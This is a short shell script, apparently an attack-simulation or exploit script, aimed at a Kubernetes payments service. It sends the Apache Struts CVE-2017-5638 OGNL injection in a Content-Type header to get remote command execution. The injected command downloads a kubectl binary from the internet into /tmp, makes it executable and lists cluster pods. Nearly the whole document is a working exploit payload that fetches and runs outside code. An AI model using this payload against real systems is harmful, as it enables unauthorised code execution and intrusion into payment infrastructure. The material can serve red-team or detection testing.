#!/bin/sh
set -eu

export namespace='payments'
export svc='visa-processor-service'
export port='8080'

export command='curl --max-time 120 -s -k -L -o /tmp/kubectl https://dl.k8s.io/release/v1.27.2/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods'

echo "Exploiting deployment..."
curl --max-time 120 -s -k \
    -X GET \
    -H "User-Agent: curl" \
    -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='${command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
    http://${svc}.${namespace}.svc.cluster.local:${port}/apachestruts-cve20175638.action 2>/dev/null || true

echo "All done!"
